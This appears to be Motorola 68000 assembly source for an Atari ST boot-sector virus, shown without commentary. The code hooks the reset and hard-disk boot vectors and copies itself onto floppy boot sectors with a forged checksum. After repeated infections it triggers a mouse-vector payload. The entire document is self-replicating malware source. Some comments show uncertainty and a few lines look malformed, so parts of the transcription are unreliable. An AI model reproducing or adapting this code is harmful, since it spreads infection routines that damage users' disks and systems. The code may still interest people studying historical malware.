
START	MOVE.L	#$E0,D3			*20F64
	LEA	$140.W,A1		VIRUS BASE ADDRESS
	LEA	START(PC),A2		
	MOVE.L	(A2),D2
	CMP.L	(A1),D2			IS VIRUS ALREADY PRESENT?
	BEQ	END
	MOVE.L	#$31415926,D0		
	CLR.L	D1
	CMP.L	$426.W,D0		RESET IN PLACE?
	BNE	MISSIT
	MOVE.L	$42A.W,D1
MISSIT	LEA	SAVEOLDRESET(PC),A0
	MOVE.L	D1,(A0)
	LEA RESETVECTOR(PC),A0
	MOVE.L	A0,$42A.W		NEW RESET VECTOR
	MOVE.L	D0,$426.W		INITIALIZE RESET
L20FA2	MOVE.W	(A2)+,(A1)+		COPY VIRUS TO $140
	DBF	D3,L20FA2
	LEA FUCK(PC),A1
	MOVE.L #$FFFFFFFB,(A1)
	BSR.S	PUT_IN_VIRUS
END	RTS

SAVEOLDRESET
	DC.L 0

RESETVECTOR			*$194.W
	MOVEA.L	$42E.W,A1
	SUBA.L	#$8000,A1
	SUBA.L	#$200,A1
	MOVE.L	A1,D1
	MOVE.L	#$12123456,(A1)+
	MOVE.L	D1,(A1)+
	LEA	PUT_IN_VIRUS(PC),A3
	LEA	VIRUS(PC),A4
LOOP	MOVE.W	(A3)+,(A1)+
	CMPA.L	A4,A3
	BLT.S	LOOP
	LEA	START(PC),A3
	MOVE.L	A3,(A1)+
	MOVEA.L	D1,A3
	CLR.W	D0
	MOVE.W	#$FE,D2
LOOP1	ADD.W	(A3)+,D0
	DBF	D2,LOOP1
	MOVE.W	#$5678,D2
	SUB.W	D0,D2
	MOVE.W	D2,(A3)
	MOVE.L	#0,$426.W
	MOVEA.L	SAVEOLDRESET(PC),A1
	CMPA.L	#0,A1
	BNE	L21014
	JMP	(A6)
L21014	JMP	(A1)

PUT_IN_VIRUS
	MOVE.L	#$31415926,$426.W	THE VIRUS 
	MOVE.L	$472.W,D0		HARD DISK BOOT
	LEA	END_IT_ALL+2(PC).W,A0	PUT HARD DISK ADDRESS IN EXIT BOOT
	MOVE.L	D0,(A0)
	LEA	VIRUS(PC),A0		GET THE VIRUS ADDRESS	
	MOVE.L	A0,$472.W		PUT IN HARD DISK BOOT
	RTS

VIRUS	MOVE.W	4(A7),D0		THE ACTUAL VIRUS
	CMP.W	#2,D0			GET DRIVE TYPE!!
	BGE	END_IT_ALL
	MOVEM.L	D1-5/D7/A0-7,-(A7)
	MOVE.W	D0,D7			TRANSFER TO D7
	MOVE.L	#1,-(A7)
	MOVE.L	#$10000,-(A7)		BOOTSECTOR
	MOVE.W	D7,-(A7)		DRIVE ??
	CLR.L	-(A7)
	LEA	$4C6.W,A5
	MOVEA.L	(A5),A5
	MOVEA.L	A5,A6
	MOVE.L	A5,-(A7)		THE 1024 BYTE DRIVE BUFFER
	MOVE.W	#8,-(A7)		READ BOOTSECTOR
	TRAP	#14
	ADDA.L	#$14,A7
	TST.W	D0			ANY DISK ERROR
	BMI	GET_OUT
	MOVE.W	#$601C,(A5)		MAKE BOOTEXECUTABLE
	ADDA.L	#$1E,A5			THEN COPY IN THE VIRUS CODE!
	LEA	START(PC),A4
	LEA	END_OF_VIRUS(PC),A3
MAKE_VIRUS_LOOP
	MOVE.W	(A4)+,(A5)+
	CMPA.L	A3,A4			LIKE SO!!
	BLT.S	MAKE_VIRUS_LOOP
	MOVEA.L	A6,A5			START OF BOOT
	MOVE.W	#$FE,D1			MAKE UP CHECKSUM
	MOVE.W	#$1234,D0
CHECKSUM
	SUB.W	(A5)+,D0
	DBF	D1,CHECKSUM

	MOVE.W	D0,(A5)			AND PUT IT AT THE END OF THE BOOT
	MOVE.L	#1,-(A7)		WRITE 1 SECTOR
	MOVE.L	#$10000,-(A7)		THE BOOTSECTOR!!
	MOVE.W	D7,-(A7)		DRIVE ??
	CLR.L	-(A7)			
	MOVE.L	A6,-(A7)		THE ADDRESS OF THE 1024 BYTE BUFFER
	MOVE.W	#9,-(A7)
	TRAP	#14 
	ADDA.L	#$14,A7
	TST.W	D0
	BMI	GET_OUT
	LEA 	FUCK(PC),A0
	ADDI.L	#1,(A0)			HOW MANY TIMES WRITTEN
	CMPI.L	#5,(A0)			IF 5 THEN DO MOUSE THING!
	BNE	GET_OUT
	CLR.L	(A0)			WAIT FOR 5 MORE TIMES
	MOVE.W	#$22,-(A7)		GET ADDRESS OF MOUSE VEC
	TRAP	#14
	ADDQ.L	#2,A7
	ADD.L	#$10,D0			NOT SURE HOW IT MAKES MOUSE GO!
	EXG	D0,A0
	MOVE.L	(A0),-(A7)
	PEA	L2110A(PC)
	MOVE.L	#1,-(A7)
	TRAP	#14
	ADDA.L	#$C,A7
	LEA 	SHIT(PC),A0
	EORI.B	#1,$(A0)
GET_OUT	MOVEM.L	(A7)+,D1-7/A0-6
END_IT_ALL
	JMP	$FC0DE6
SHIT	DC.L 0		*$2E6.W
FUCK	DC.L 0		*$2EA.W
	BTST	D0,D1
	ORI.B	#4,D0
	DC.W	$FFFF
END_OF_VIRUS